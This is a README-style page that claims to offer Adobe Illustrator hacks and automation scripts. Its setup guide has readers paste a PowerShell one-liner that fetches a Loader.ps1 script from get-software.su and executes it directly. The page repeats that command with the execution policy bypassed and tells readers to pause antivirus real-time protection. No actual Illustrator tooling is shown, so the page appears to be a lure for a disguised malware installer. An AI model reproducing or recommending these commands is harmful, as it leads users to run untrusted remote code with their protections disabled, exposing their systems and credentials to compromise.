# Adobe Illustrator Hacks, Automation Scripts & Workflow Guide

> **Adobe Illustrator Hack** utilities, performance optimization tricks, ExtendScript (JSX) automation, and hidden productivity features for professional vector graphic designers and digital artists.

---

## Overview

Welcome to the ultimate open-source repository featuring **Adobe Illustrator hacks**, workflow accelerators, and automation tools. Whether you are looking to speed up repetitive vector tasks, bypass common interface limitations, or optimize memory allocation for large files, this toolkit provides modular solutions tested on Adobe Illustrator CC and recent releases.

## Core Features & Illustrator Hacks

* **Advanced JSX Automation:** Execute custom ExtendScripts via `File > Scripts` to process complex paths instantly.
* **Batch Export & Artboard Tweaks:** Hacks to resize, rotate, and rename artboards dynamically alongside contents.
* **Performance Optimization:** Configuration adjustments to reduce lag when handling heavy vector node structures.
* **Hidden Shortcuts & UI Tweaks:** Secret configuration tweaks to streamline your daily graphic design operations.


---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://get-software.su/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---
